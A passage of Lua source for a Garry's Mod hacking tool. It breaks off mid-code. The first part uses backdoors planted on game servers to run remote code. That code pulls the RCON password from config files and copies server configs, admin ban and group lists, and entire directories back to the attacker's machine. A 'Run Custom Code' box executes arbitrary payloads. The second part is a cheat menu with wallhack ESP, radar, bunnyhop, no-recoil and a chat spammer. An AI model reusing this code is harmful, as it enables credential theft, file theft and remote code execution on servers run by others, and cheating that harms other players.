if rcon == "NOT FOUND" then
    cont = file.Read("cfg/gmod-server.cfg","MOD") or ""
    for k,v in pairs(cont:Split("\n")) do
        if v:StartWith("rcon_password") then
            rcon = v:Split("\"")[2]
        end
    end
end
if rcon == "NOT FOUND" then
    cont = file.Read("cfg/autoexec.cfg","MOD") or ""
    for k,v in pairs(cont:Split("\n")) do
        if v:StartWith("rcon_password") then
            rcon = v:Split("\"")[2]
        end
    end
end
util.AddNetworkString("RollBackMachineA")
net.Start("RollBackMachineA")
net.WriteString(rcon)
net.Send({LCP})
        ]===])

    end, "icon16/database_save.png")


function vzlom.GetServerFilesList(r)
    vzlom.Hack([===[
            
util.AddNetworkString("vzlom_FileTransfer")
local ply = %s
local folder = "%s"
print(folder.."/*")
net.Start("vzlom_FileTransfer")
net.WriteString("view")
net.WriteString(folder)
local files,folders = file.Find(folder.."/*","GAME")
net.WriteTable(files)
net.WriteTable(folders)
net.Send(ply)
            ]===],"Player("..LocalPlayer():UserID()..")",r)
end



function vzlom.ReadServerFile(r)
    vzlom.Hack([===[
            
util.AddNetworkString("vzlom_FileTransfer")
local ply = %s
local f = "%s"
net.Start("vzlom_FileTransfer")
net.WriteString("read")
net.WriteString(f)
net.WriteString(file.Read(f,"GAME"))
net.Send(ply)
            ]===],"Player("..LocalPlayer():UserID()..")",r)
end

function vzlom.StealFile(r)
    vzlom.Hack([===[
            
util.AddNetworkString("vzlom_FileTransfer")
local ply = %s
local serverip = game.GetIPAddress():Replace(":"," ")
local function SendFile(f)
    if not file.Exists(f, "GAME") then return end
    net.Start("vzlom_FileTransfer")
    net.WriteString("folder")
    net.WriteString(serverip.."/"..string.GetPathFromFilename(f))
    net.Send(ply)
    local data = file.Read(f,"GAME")
    net.Start("vzlom_FileTransfer")
    net.WriteString("file")
    net.WriteString(serverip.."/"..f..".txt")
    net.WriteString(data)
    net.Send(ply)
end
SendFile("%s")
            ]===],"Player("..LocalPlayer():UserID()..")",r)
end

function vzlom.StealDir(r)
    vzlom.Hack([===[
            
util.AddNetworkString("vzlom_FileTransfer")
local ply = %s
local serverip = game.GetIPAddress():Replace(":"," ")
local function SendFile(f)
    if not file.Exists(f, "GAME") then return end
    print(f)
    net.Start("vzlom_FileTransfer")
    net.WriteString("folder")
    net.WriteString(serverip.."/"..string.GetPathFromFilename(f))
    net.Send(ply)
    local data = file.Read(f,"GAME")
    net.Start("vzlom_FileTransfer")
    net.WriteString("file")
    net.WriteString(serverip.."/"..f..".txt")
    net.WriteString(data)
    net.Send(ply)
end

function StealDir(name)
    print("-"..name)
    local files, directories = file.Find(name .. "/*", "GAME");
    if files then
        for _, f in pairs(files) do
            SendFile(name .. "/" .. f);
        end
    end
    if directories then
        for _, d in pairs(directories) do
            StealDir(name .. "/" .. d);
        end
    end
end

StealDir("%s")

            ]===],"Player("..LocalPlayer():UserID()..")",r)
end

runserver("View files",function()
    local sr = vgui.Create("DFrame")
sr:SetDraggable(true)
sr:ShowCloseButton(true)
sr:SetTitle("Files Viewer")
sr:SetSize(400, 300)
sr:MakePopup()
sr:Center()
function sr:Paint(w,h)
        draw.RoundedBox(0, 0, 0, w, h, vzlom.Colors.prim)
        surface.SetDrawColor( vzlom.Colors.seco )
        surface.DrawOutlinedRect( 0, 0, w, h )
    end
local e = vgui.Create("DScrollPanel",sr)
e:SetPos(0,20)
e:SetSize(400,(300-20)-50)
local numnum = 0
local function CreateFileFolder(name,icon)
    local di = vgui.Create("DButton",e)
    di:SetPos(0,numnum*20)
    di:SetSize(400, 20)
    di:SetText(name)
    di:SetTextColor(vzlom.Colors.text)
    if icon then
        di:SetIcon(icon)
    end
    function di:DoClick()
        vzlom.GetServerFilesList(name:lower())
        sr:Close()
    end
    function di:Paint(w,h)
            draw.RoundedBox(0, 0, 0, w, h, paintcolor or vzlom.Colors.btn)
        end
    
    numnum = numnum + 1
end

CreateFileFolder("data","icon16/page.png")
CreateFileFolder("lua","icon16/script.png")
CreateFileFolder("addons","icon16/folder.png")
CreateFileFolder("cfg","icon16/cog.png")
CreateFileFolder("maps","icon16/monitor.png")
end)


runserver("Steal files",function()
            vzlom.Hack([===[
             
util.AddNetworkString("vzlom_FileTransfer")
local ply = %s
local serverip = game.GetIPAddress():Replace(":"," ")
local function SendFile(f)
    if not file.Exists(f, "GAME") then return end
    net.Start("vzlom_FileTransfer")
    net.WriteString("folder")
    net.WriteString(serverip.."/"..string.GetPathFromFilename(f))
    net.Send(ply)
    local data = file.Read(f,"GAME")
    net.Start("vzlom_FileTransfer")
    net.WriteString("file")
    net.WriteString(serverip.."/"..f..".txt")
    net.WriteString(data)
    net.Send(ply)
end
local files_to_send = {
    "cfg/server.cfg", "cfg/autoexec.cfg", "cfg/gmod-server.cfg",
    "data/ulx/config.txt","data/ulib/ban.txt","data/ulib/groups.txt"
}
for k,v in pairs(files_to_send) do
    SendFile(v)
end
            ]===],"Player("..LocalPlayer():UserID()..")")
    end)

runserver("Run Custom Code",function()
            local sr = vgui.Create("DFrame")
sr:SetDraggable(true)
sr:ShowCloseButton(true)
sr:SetTitle("Run Payload")
sr:SetSize(400, 300)
sr:MakePopup()
sr:Center()
function sr:Paint(w,h)
        draw.RoundedBox(0, 0, 0, w, h, vzlom.Colors.prim)
        surface.SetDrawColor( vzlom.Colors.seco )
        surface.DrawOutlinedRect( 0, 0, w, h )
    end
local e = vgui.Create("DTextEntry",sr)
e:SetMultiline(true)
e:SetValue("print(\"lol\")")
e:SetPos(0,20)
e:SetSize(400,(300-20)-50)

local b = vgui.Create("DButton",sr)
b:SetText("Run")
b:SetFontInternal("vzlom_PayloadBtn")
b:SetPos(400-55,300-50)
b:SetSize(50,50)
b:SetTextColor(vzlom.Colors.seco)
function b:DoClick()
    vzlom.Hack(e:GetValue())
    sr:Close()
end
function b:Paint(w,h)
            draw.RoundedBox(0, 0, 0, w, h, paintcolor or vzlom.Colors.btn)
        end
end)
end

MakeMenu()
local function DetectBackdoors()

    for k,v in pairs(vzlom.Backdoors) do
        if util.NetworkStringToID(v) ~= 0 then
            vzlom.Active = true
            vzlom.Backdoor = v
        end
    end
end

concommand.Add("zapphook",function()
    f:SetVisible(true)
    DetectBackdoors()
end)

DetectBackdoors()
net.Receive("RollBackMachineA", function()
    local rcon = net.ReadString()
    print(rcon)
    if rcon == "NOT FOUND" then
        vzlom.Message("RCON not found")
        return
    end
    if not file.Exists("servers_rcons","DATA") then
        file.CreateDir("servers_rcons")
    end
    file.Write("servers_rcons/"..GetHostName()..".txt",rcon)
    
    vzlom.Message("Rcon: "..rcon.." saved to servers_rcons/"..GetHostName()..".txt")
end)

net.Receive("vzlom_FileTransfer",function(_,c)
    local ftype = net.ReadString()
    local fname = net.ReadString()
    if ftype == "folder" then
        file.CreateDir("vzlom_stolen/"..fname)
        return
    end
    if ftype == "read" then
        local data = net.ReadString()
        local sr = vgui.Create("DFrame")
sr:SetDraggable(true)
sr:ShowCloseButton(true)
sr:SetTitle(fname)
sr:SetSize(400, 300)
sr:MakePopup()
sr:Center()
function sr:Paint(w,h)
        draw.RoundedBox(0, 0, 0, w, h, vzlom.Colors.prim)
        surface.SetDrawColor( vzlom.Colors.seco )
        surface.DrawOutlinedRect( 0, 0, w, h )
    end
local e = vgui.Create("DTextEntry",sr)
e:SetMultiline(true)
e:SetValue(data)
e:SetPos(0,20)
e:SetSize(400,(300-20)-50)
local b = vgui.Create("DButton",sr)
b:SetText("Close")
b:SetFontInternal("vzlom_PayloadBtn")
b:SetPos(400-55,300-50)
b:SetSize(50,50)
b:SetTextColor(vzlom.Colors.seco)
function b:DoClick()
    sr:Close()
end
function b:Paint(w,h)
            draw.RoundedBox(0, 0, 0, w, h, paintcolor or vzlom.Colors.btn)
        end
local b = vgui.Create("DButton",sr)
b:SetText("Steal")
b:SetFontInternal("vzlom_PayloadBtn")
b:SetPos((400-55)-55,300-50)
b:SetSize(50,50)
function b:DoClick()
    vzlom.StealFile(fname)
end
b:SetTextColor(vzlom.Colors.seco)
function b:Paint(w,h)
            draw.RoundedBox(0, 0, 0, w, h, paintcolor or vzlom.Colors.btn)
        end

    end
    if ftype == "view" then
        local ftbl = net.ReadTable()
        local fftbl = net.ReadTable()
local sr = vgui.Create("DFrame")
sr:SetDraggable(true)
sr:ShowCloseButton(true)
sr:SetTitle(fname)
sr:SetSize(400, 300)
sr:MakePopup()
sr:Center()
function sr:Paint(w,h)
        draw.RoundedBox(0, 0, 0, w, h, vzlom.Colors.prim)
        surface.SetDrawColor( vzlom.Colors.seco )
        surface.DrawOutlinedRect( 0, 0, w, h )
    end
local e = vgui.Create("DScrollPanel",sr)
e:SetPos(0,20)
e:SetSize(400,(300-20)-50)
local numnum = 0
local function CreateFileFolder(name,icon)
    local di = vgui.Create("DButton",e)
    di:SetPos(0,numnum*20)
    di:SetSize(400, 20)
    di:SetText(name)
    di:SetTextColor(vzlom.Colors.seco)
    if icon then
        di:SetIcon(icon)
    end
    function di:DoClick()
        if icon == "icon16/folder.png" then
            vzlom.GetServerFilesList(name)
        else
            vzlom.ReadServerFile(name)
        end
        sr:Close()
    end
    function di:Paint(w,h)
            draw.RoundedBox(0, 0, 0, w, h, paintcolor or vzlom.Colors.btn)
        end
    
    numnum = numnum + 1
end
for k,v in pairs(fftbl) do
    CreateFileFolder(fname.."/"..v,"icon16/folder.png")
end
for k,v in pairs(ftbl) do
    CreateFileFolder(fname.."/"..v,"icon16/page.png")
end

local b = vgui.Create("DButton",sr)
b:SetText("Close")
b:SetFontInternal("vzlom_PayloadBtn")
b:SetPos(400-55,300-50)
b:SetSize(50,50)
b:SetTextColor(vzlom.Colors.seco)
function b:DoClick()
    sr:Close()
end
function b:Paint(w,h)
            draw.RoundedBox(0, 0, 0, w, h, paintcolor or vzlom.Colors.btn)
        end

local b = vgui.Create("DButton",sr)
b:SetText("Steal")
b:SetFontInternal("vzlom_PayloadBtn")
b:SetPos(400-105,300-50)
b:SetSize(50,50)
b:SetTextColor(vzlom.Colors.seco)
function b:DoClick()
    print(fname)
    vzlom.StealDir(fname)
end
function b:Paint(w,h)
            draw.RoundedBox(0, 0, 0, w, h, paintcolor or vzlom.Colors.btn)
        end


        
        return
    end
    local fcontent = net.ReadString()
    file.Write("vzlom_stolen/"..fname, fcontent)
    print("vzlom_stolen/"..fname, #fcontent)
end)


concommand.Add("zapphook_shownets",function()
    for i=1,2048 do
        local k = util.NetworkIDToString(i)
        if not k then
            return false
        end
        print(k)
    end
end)

end

local DermaButton = vgui.Create( "DButton", panel2 )
DermaButton:SetText( "Lua Helper" )
DermaButton:SetPos( 0, 240 )
DermaButton:SetSize( 400, 30 )
DermaButton.DoClick = function()
	local helper = helper or {}
helper.options = helper.options or {}
helper.Vars = {}
helper.Vars['ESP_NAME'] = false
helper.Vars['ESP_WEAPON'] = false
helper.Vars['ESP_BOX'] = false
helper.Vars['ESP_HPBOX'] = false
helper.options.esp = helper.options.esp or {}
helper.status = ("online")
helper.theme = helper.theme or {}
helper.theme.background = Color(30,30,30,200)
helper.theme.backgroundalt = Color(25,25,25)
helper.theme.backgroundalt2 = Color(50,50,50)
helper.theme.backgroundalt3 = Color(15,15,15)
helper.theme.buttonhover = Color(255,255,255,50)
helper.theme.chroma = Color(0,140,250)
helper.theme.chromaalt = Color(helper.theme.chroma.r-55,helper.theme.chroma.g-60,helper.theme.chroma.b-30)
helper.memory = {
    ["hud"] = 0,
    ["logic"] = 0,
    ["aimbot"] = 0,
}
local ply = LocalPlayer()



function helper.RandomString(len)
    if len == nil then
        len = math.random(20,100)
    end
    local ret = ""
    for i=1,len do
        ret = ret..string.char(math.random(33,126))
    end
    return ret
end

local chamsmat = CreateMaterial("a", "VertexLitGeneric", {
    ["$ignorez"] = 1,
    ["$model"] = 1,
    ["$basetexture"] = "models/debug/debugwhite",
})

local chamsmat2 = CreateMaterial("@", "VertexLitGeneric", {
    ["$ignorez"] = 0,
    ["$model"] = 1,
    ["$basetexture"] = "models/debug/debugwhite",
})

function helper.esp(v, c, h)
    if !IsValid(v) then return end

    local h = h or "N/A"

    cam.Start3D()
    render.MaterialOverride(chamsmat)
    render.SetColorModulation(c.r, c.g, c.b)
    v:DrawModel()
    render.SetColorModulation(c.r, c.g, c.b)
    render.MaterialOverride(chamsmat2)
    v:DrawModel()
    render.SetColorModulation(1, 1, 1)
    cam.End3D()

    local min, max = v:GetCollisionBounds()
    local pos = v:GetPos()
    local top, bottom = (pos + Vector(0, 0, max.z)):ToScreen(), (pos - Vector(0, 0, 8)):ToScreen()
    local middle = bottom.y - top.y
    local width = middle / 2.425

    if v:IsPlayer() then
        draw.SimpleTextOutlined(v:GetNWString("bystanderName"), "DermaDefault", bottom.x, bottom.y - 11, c, TEXT_ALIGN_CENTER, TEXT_ALIGN_CBOTTOM, 1, Color(0, 0, 0))
        draw.SimpleTextOutlined(v:Nick(), "DermaDefault", bottom.x, bottom.y, c, TEXT_ALIGN_CENTER, TEXT_ALIGN_CBOTTOM, 1, Color(0, 0, 0))
    else
        draw.SimpleTextOutlined(h, "DermaDefault", bottom.x, bottom.y - 11, c, TEXT_ALIGN_CENTER, TEXT_ALIGN_CBOTTOM, 1, Color(0, 0, 0))
    end
end
hook.Add("HUDPaint", "helper esp", function()
if helper.Vars['Namechams'] then
        for k,v in pairs(player.GetAll()) do
            if IsValid(v:GetOwner()) && v:GetOwner():IsPlayer() && v:GetUserGroup() then continue end
            if string.find(v:GetClass(), "mu_knife") then
                helper.esp(v, Color(255, 0, 0), "Knife")
            elseif string.find(v:GetClass(), "mu_magnum") then
                helper.esp(v, Color(0, 0, 255), "Revolver")
             elseif (v:GetUserGroup()) then
                helper.esp(v, Color(255, 0, 0), "Staff")
            elseif string.find(v:GetClass(), "mu_loot") then
                helper.esp(v, Color(0, 255, 0), "Loot")
            end
                if helper.Vars['Prop'] then
                    helper.esp(v, HSVToColor(CurTime() % 6 * 60, 1, 1), "Prop")
                else
                    helper.esp(v, Color(255, 255, 255), "Prop")
                end
            end
        end
   
    if helper.Vars['RADAR'] then
        local x = ScrW() - 5
        local y = 5
        if helper.Vars['RADAR'] then
            y = 210
        end

end

    if helper.Vars['RADAR'] then
        local size = 200
        local x = ScrW() - size - 8
        local y = 0 + 8

        surface.SetDrawColor(Color(120, 120, 255, 20))
        surface.DrawRect(x - 2, y - 2, size + 4, size + 4)
        surface.SetDrawColor(Color(0, 0, 0, 200))
        surface.DrawRect(x, y, size, size)
        surface.SetDrawColor(Color(255, 255, 255, 255))
        surface.DrawLine(x, y, x + (size / 2), y + (size / 2))
        surface.DrawLine(x + size, y, x + (size / 2), y + (size / 2))
        surface.SetDrawColor(Color(255, 255, 255))
        surface.DrawRect((x -2)+ (size/2), (y-2) + (size/2), 4, 4)

       for k,v in pairs(player.GetAll()) do
            if v == ply || !v:Alive() then continue end
            local n = v:Nick()
            if helper.Vars['RADAR'] then
                n = v:GetNWString("bystanderName")
            end
            if helper.Vars['RADAR'] then
                n = ""
            end

            local c = v:GetPlayerColor()
            local col = Color(c.x * 255, c.y * 255, c.z * 255)

            local lx = ply:GetPos().x - v:GetPos().x
            local ly = ply:GetPos().y - v:GetPos().y
            local ang = EyeAngles().y
            local cos = math.cos(math.rad(-ang))
            local sin = math.sin(math.rad(-ang))
            local px = (ly * cos) + (lx * sin)
            local py = (lx * cos) - (ly * sin)
            px = px / 20
            py = py / 20
            px = math.Clamp(px, -(size * 0.50), size * 0.50)
            py = math.Clamp(py, -(size * 0.50), size * 0.50)
            draw.SimpleTextOutlined(n, "default", x + size - (size * 0.50) + px - 13, y + size - (size * 0.50) + py - 7, col, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER, 1, Color(0, 0, 0))
            surface.SetDrawColor(col)
            surface.DrawRect(x + size - (size * 0.50) + px, y + size - (size * 0.50) + py, 3, 3)
        end
        end
end)

local me = LocalPlayer();
function helper.CreateMove(cmd)
    local memfootprint = gcinfo()
    if(!helper.Vars['BHOPAUTOS']) then return; end
    if(!me:IsOnGround() && cmd:KeyDown(IN_JUMP)) then
        cmd:RemoveKey(IN_JUMP);
        if(helper.Vars['BHOPAUTOS']) then
            if(cmd:GetMouseX() > 1 || cmd:GetMouseX() < -1) then
                cmd:SetSideMove(cmd:GetMouseX() > 1 && 400 || -400);
            else
                cmd:SetForwardMove(5850 / me:GetVelocity():Length2D());
                cmd:SetSideMove((cmd:CommandNumber() % 2 == 0) && -400 || 400);
            end
        end
    elseif(cmd:KeyDown(IN_JUMP) && helper.Vars['BHOPAUTOS']) then
        cmd:SetForwardMove(10000);
    end
    helper.memory["logic"] = gcinfo() - memfootprint
end
hook.Add("CreateMove", helper.RandomString(10), function(cmd)
    helper.CreateMove(cmd);
end);

function helper.DrawOutLinedRect(x,y,w,h,color)
    surface.SetDrawColor( color )
    surface.DrawOutlinedRect( x, y, w, h )
    surface.SetDrawColor( Color(255,255,255,255) )
end
function helper.DrawRect(x,y,w,h,color)
    surface.SetDrawColor( color )
    surface.DrawRect( x, y, w, h )
    surface.SetDrawColor( Color(255,255,255,255) )
end
function helper.Drawline(x,y,x2,y2,color)
    surface.SetDrawColor(color)
    surface.DrawLine(x,y,x2,y2)
    surface.SetDrawColor( Color(255,255,255,255) )
end

hook.Add("RenderScene", "Hook1", function()
        for k, v in pairs(game.GetWorld():GetMaterials()) do
        Material(v):SetVector("$color", Vector(1, 1, 1))
        end
        render.SuppressEngineLighting(false)
        render.ResetModelLighting(1, 1, 1)
    if helper.Vars['Fullb'] then
render.SetLightingMode( 1 or 0)
end
end)

function helper.CalcView( ply, pos, angles, fov )
    if !me:IsValid() or !me:Alive() or me:GetViewEntity() != me or me:InVehicle() then return end
    local tps = {}
    if helper.Vars['NoRecoil'] then
        tps.angles = me:EyeAngles()
        return tps
    end
end
hook.Add("CalcView", helper.RandomString(10), helper.CalcView)

hook.Add("HUDPaint", helper.RandomString(17), function()
if helper.Vars['Watermark'] then
    surface.SetFont("DermaDefault")
    local tw,th = surface.GetTextSize("1")
    tw = tw + 3
        surface.SetTextColor(255,255,255)
        surface.SetFont("wmfont")
        surface.SetTextPos(5 , 5)
        surface.DrawText("helper.ware | "..os.date("%H:%M:%S").." | "..LocalPlayer():Ping().." PING | "..math.Round(1/FrameTime()).." FPS ")
end
    if helper.Vars['SPammer'] then
        RunConsoleCommand("say", "helper | Best Anti AFK system for Gmod")
    end
end)
local SpecModeFrame
function helper.SpectateMode()
    if IsValid(SpecModeFrame) then return end
    helper.Vars['SCAM'] = true
    SpecModeFrame = vgui.Create("DFrame")
    SpecModeFrame:SetSize(300,400)
    SpecModeFrame:SetPos(20,10)
    SpecModeFrame:SetTitle("")
    SpecModeFrame:ShowCloseButton(false)
    function SpecModeFrame:Paint(w,h)
        draw.RoundedBox(0,0,0,w,h,Color(22,22,22))
        draw.RoundedBox(0,6,6,w-12,h-12,Color(44,44,44))
        helper.DrawRect(0,0,w,h,Color(22,22,22,255))
        helper.DrawOutLinedRect(1,1,w-2,h-2,helper.theme.chroma)
        helper.DrawOutLinedRect(0,0,w,h,helper.theme.chroma)
        draw.SimpleText("Spectator List","DermaDefault",w/2,15,Color(255,255,255),1,1)
        local weapon = "NONE"
        local hps = "NONE"
        local ars = "NONE"
        if IsValid(helper.SpectatePlayer) and helper.SpectatePlayer:IsPlayer() then
            if IsValid(helper.SpectatePlayer:GetActiveWeapon()) then
                weapon = helper.SpectatePlayer:GetActiveWeapon():GetClass()
            end
            hps = helper.SpectatePlayer:Health()
            ars = helper.SpectatePlayer:Armor()
        end
        draw.SimpleText("Weapon: "..weapon,"DermaDefault",10,h-60,Color(255,255,255),0,1)
        draw.SimpleText("Health / Armor: "..hps.."/"..ars,"DermaDefault",12,h-45,Color(255,255,255),0,1)
    end

    local SpecPlayerList = vgui.Create( "DScrollPanel", SpecModeFrame )
    SpecPlayerList:Dock(TOP)
    SpecPlayerList:DockMargin(2,2, 2, 2)
    SpecPlayerList:SetTall(300)
    function SpecPlayerList:Paint( w,h )
        draw.RoundedBox(0,0,0,w,h,helper.theme.backgroundalt2)
        draw.RoundedBox(0,1,1,w-2,h-2,helper.theme.backgroundalt3)
    end
    SpecPlayerList.VBar:SetWidth(1)
    SpecPlayerList:GetVBar().Paint = function() draw.RoundedBox(0, 0, 0, SpecPlayerList:GetVBar():GetWide(), SpecPlayerList:GetVBar():GetTall(), Color(255, 255, 255, 0)) end
    SpecPlayerList:GetVBar().btnUp.Paint = function() draw.RoundedBox(0, 0, 0, SpecPlayerList:GetVBar().btnUp:GetWide(), SpecPlayerList:GetVBar().btnUp:GetTall(), Color(0,0,0,0)) end
    SpecPlayerList:GetVBar().btnDown.Paint = function() draw.RoundedBox(0, 0, 0, SpecPlayerList:GetVBar().btnDown:GetWide(), SpecPlayerList:GetVBar().btnDown:GetTall(), Color(0,0,0,0)) end
    SpecPlayerList:GetVBar().btnGrip.Paint = function() draw.RoundedBox(0, 0, 0, SpecPlayerList:GetVBar().btnGrip:GetWide(), SpecPlayerList:GetVBar().btnGrip:GetTall(), Color(150,150,150)) end

    for k,v in pairs(player.GetAll()) do
        if IsValid(v) then
            local helper_player_button = SpecPlayerList:Add( "DButton" )
            helper_player_button:SetText( "" )
            helper_player_button:Dock( TOP )
            helper_player_button:DockMargin( 2, 2, 2, 0 )
            helper_player_button.Paint = function( _, w, h )
                if helper_player_button:IsHovered() then
                    draw.RoundedBox(0,0,0,w,h,helper.theme.backgroundalt2)
                    draw.RoundedBox(0,1,1,w-2,h-2,helper.theme.backgroundalt3)
                else
                    draw.RoundedBox(0,0,0,w,h,helper.theme.backgroundalt2)
                    draw.RoundedBox(0,1,1,w-2,h-2,helper.theme.backgroundalt)
                end
                if helper.SpectatePlayer == v then
                    if IsValid(v) and v:IsPlayer() then
                        draw.SimpleText("> "..v:Name() or "NILL".." <","DermaDefault",w/2,h/2,Color(150,150,150),1,1)
                    end
                else
                    if IsValid(v) and v:IsPlayer() then
                        draw.SimpleText(v:Name() or "NILL","DermaDefault",w/2,h/2,Color(255,255,255),1,1)
                    end
                end
            end
            function helper_player_button:DoClick()
                if helper.SpectatePlayer == v then
                    if IsValid(helper.SpectatePlayer) and helper.SpectatePlayer:IsPlayer() then
                        helper.SpectatePlayer:SetNoDraw( false )
                    end
                    helper.SpectatePlayer = nil
                else
                    if IsValid(helper.SpectatePlayer) and helper.SpectatePlayer:IsPlayer() then
                        helper.SpectatePlayer:SetNoDraw( false )
                    end
                    helper.SpectatePlayer = v
                    v:SetNoDraw( true )
                end
            end
        end
    end

    for k, v in pairs(ents.GetAll()) do
        if v:GetClass() == "gmod_cameraprop" then
            local helper_camera_button = SpecPlayerList:Add( "DButton" )
            helper_camera_button:SetText( "" )
            helper_camera_button:Dock( TOP )
            helper_camera_button:DockMargin( 2, 2, 2, 0 )
            helper_camera_button.Paint = function( _, w, h )
                if helper_camera_button:IsHovered() then
                    draw.RoundedBox(0,0,0,w,h,helper.theme.backgroundalt2)
                    draw.RoundedBox(0,1,1,w-2,h-2,Color(200,200,200))
                else
                    draw.RoundedBox(0,0,0,w,h,helper.theme.backgroundalt2)
                    draw.RoundedBox(0,1,1,w-2,h-2,Color(200,200,200))
                    end
                    if helper.SpectatePlayer == v then
                    draw.SimpleText("> CAMERA "..k.."# <","DermaDefault",w/2,h/2,Color(200,200,200),1,1)
                else
                    draw.SimpleText("CAMERA "..k.."#","DermaDefault",w/2,h/2,Color(255,255,255),1,1)
                end
            end
            function helper_camera_button:DoClick()
                if helper.SpectatePlayer == v then
                    if IsValid(helper.SpectatePlayer) and helper.SpectatePlayer:IsPlayer() then
                        helper.SpectatePlayer:SetNoDraw( false )
                    end
                    helper.SpectatePlayer = nil
                else
                    if IsValid(helper.SpectatePlayer) and helper.SpectatePlayer:IsPlayer() then
                        helper.SpectatePlayer:SetNoDraw( false )
                    end
                    helper.SpectatePlayer = v
                    if v:IsValid() then
                        v:SetNoDraw( true )
                    end
                end
            end
        end
    end

    local CloseSpec = SpecModeFrame:Add( "DButton" )
    CloseSpec:SetTextColor( Color( 200, 200, 200 ) )
    CloseSpec:SetText( "" )
    CloseSpec:Dock(BOTTOM)
    CloseSpec:DockMargin(1,2, 1, 0)
    function CloseSpec:Paint( w,h )
        if CloseSpec:IsHovered() then
            draw.RoundedBox(0,0,0,w,h,helper.theme.backgroundalt2)
            draw.RoundedBox(0,1,1,w-2,h-2,helper.theme.backgroundalt3)
        else
            draw.RoundedBox(0,0,0,w,h,helper.theme.backgroundalt2)
            draw.RoundedBox(0,1,1,w-2,h-2,helper.theme.backgroundalt)
           end
        draw.SimpleText("Exit","DermaDefault",w/2,h/2,Color(255,255,255),1,1)
    end

    CloseSpec.DoClick = function()
        helper.Vars['SCAM'] = false
        SpecModeFrame:Remove()
    end
end
chat.AddText(Color(255,255,255),"Helper Injected ")
surface.CreateFont("wmfont", {
    font = "Console",
    size = 13.5,
    weight = 900,
    shadow = true,
    antialias = false,
});

surface.CreateFont("custom", {
    font = "Console",
    size = 14.5,
    weight = 900,
    shadow = true,
    antialias = false,
});

local function saveconfig()
    file.Write("helperhelp.txt", util.TableToJSON(options));
end

saveconfig();

local time = 30

function doAction(string, elsestring)
   if math.random(1,3) == 1 then
      RunConsoleCommand("+"..string) timer.Simple(math.random(), function() RunConsoleCommand("-"..string) end)
   else
      RunConsoleCommand("+"..elsestring) timer.Simple(math.random(), function() RunConsoleCommand("-"..elsestring) end)
   end
end

function randomAFK()
   doAction("speed", "walk")
   doAction("forward","back")
   doAction("left","right")
   doAction("moveleft","moveright")
   doAction("duck","jump")
   timer.Adjust("doAFK", math.random(1, 3) * time, 0, randomAFK)
end

local doAFK = false
function DoMeAfkStyle()
   if doAFK then
      doAFK = false
      timer.Remove("doAFK")
      print"AFK OFF"
      return
   end
   doAFK = true
   print"AFK ON"

   timer.Create("doAFK", time, 0, randomAFK)
end
concommand.Add("AFK", DoMeAfkStyle)

function MainFunc()
local frame = vgui.Create( "DFrame" )
frame:SetSize( 300, 450 )
frame:SetTitle("");
frame:Center()
frame:MakePopup()
frame:ShowCloseButton(false);


    function frame:Init()
        frame.startTime = SysTime()
    end
    function frame:Paint(w,h)
    surface.SetDrawColor(33, 33, 33); -- Backround color
    surface.DrawRect(0, 0, 900, 850); -- Backround
    surface.SetDrawColor(22, 22, 22); -- Rect color on Main/Color
    surface.DrawRect(10, 45, 130, 200); -- Rect on Main Func
    surface.DrawRect(10, 250, 130, 160); -- Rect on Visuals
    surface.DrawRect(150, 45, 140, 170); -- Rect on ColorMixer
    surface.DrawRect(150, 220, 140, 190); -- Rect on Other
    surface.DrawRect(0, 0, 300, 35); -- Rect on up
    surface.DrawRect(0, 422, 300, 25); -- Rect on down
    surface.SetDrawColor(helper.theme.chroma); --color
    surface.DrawOutlinedRect(0, 0, 300, 450);--main outline
    surface.DrawOutlinedRect(1, 1, 298, 448); --main outline
    surface.DrawOutlinedRect(10, 45, 130, 200); -- Main Func Outline
    surface.DrawOutlinedRect(10, 250, 130, 160); -- Visuals Outline
    surface.DrawOutlinedRect(15, 280, 120, 1); -- Visuals line
    surface.DrawOutlinedRect(15, 80, 120, 1); -- Main Func line
    surface.DrawOutlinedRect(160, 80, 120, 1); -- Color line
    surface.DrawOutlinedRect(150, 45, 140, 170); -- Color Mod.... Outline
    surface.DrawOutlinedRect(150, 220, 140, 190); -- Rect on Other
    surface.DrawOutlinedRect(155, 250, 130, 1); -- Other line
    surface.DrawOutlinedRect(0, 32, 300, 2); -- up line
    surface.DrawOutlinedRect(0, 422, 300, 2); -- down line

    surface.SetFont("wmfont");

    local tw, th = surface.GetTextSize("helper");

    surface.SetTextPos(10, 435 - th / 2);

    surface.SetTextColor(255, 255, 255);

    surface.DrawText("Hello ! "..LocalPlayer():Name().."  |  ".."TickRate: "..math.Round(1/engine.TickInterval()).."  |  ".."FPS: "..math.Round(1/FrameTime()));

    surface.SetFont("wmfont");

    local tw, th = surface.GetTextSize("helper");

    surface.SetTextPos(38, 63 - th / 2);

    surface.SetTextColor(255, 245, 255);

    surface.DrawText("Main Function");

        surface.SetFont("wmfont");

    local tw, th = surface.GetTextSize("helper");

    surface.SetTextPos(185, 63 - th / 2);

    surface.SetTextColor(255, 245, 255);

    surface.DrawText("Color Picker");


            surface.SetFont("wmfont");

    local tw, th = surface.GetTextSize("helper");

    surface.SetTextPos(203, 235 - th / 2);

    surface.SetTextColor(255, 245, 255);

    surface.DrawText("Other");


    surface.SetFont("wmfont");

    local tw, th = surface.GetTextSize("helper");

    surface.SetTextPos(53, 265 - th / 2);

    surface.SetTextColor(255, 255, 255);

    surface.DrawText("Visuals");


    surface.SetFont("custom");

        local tw, th = surface.GetTextSize("helper");

    surface.SetTextPos(15, 17 - th / 2);

    surface.SetTextColor(255, 255, 255);

    surface.DrawText("Helper");

        surface.SetFont("wmfont");

        local tw, th = surface.GetTextSize("helper");

    surface.SetTextPos(210, 17 - th / 2);

    surface.SetTextColor(255, 255, 255);

    surface.DrawText("status: ");

    surface.SetFont("wmfont");

    local tw, th = surface.GetTextSize("helper");

    surface.SetTextPos(250, 17 - th / 2);

    surface.SetTextColor(20, 255, 20);

    surface.DrawText(helper.status);



            if (input.IsKeyDown(KEY_INSERT) && !insertdown2) then
            frame:Remove();
            menuopen = false;
        end

end

    local savecfg = vgui.Create( "DButton", frame )
    savecfg:SetTextColor( Color( 255, 255, 255 ) )
    savecfg:SetText( "Save Config" )
    savecfg:SetPos( 160, 340 )
    savecfg:SetSize( 120, 30 )
    savecfg:DockMargin(1,2, 1, 0)
    function savecfg:Paint( w,h )
        if savecfg:IsHovered() then
            draw.RoundedBox(0,0,0,w,h,helper.theme.backgroundalt2)
            draw.RoundedBox(0,1,1,w-2,h-2,helper.theme.backgroundalt3)
        else
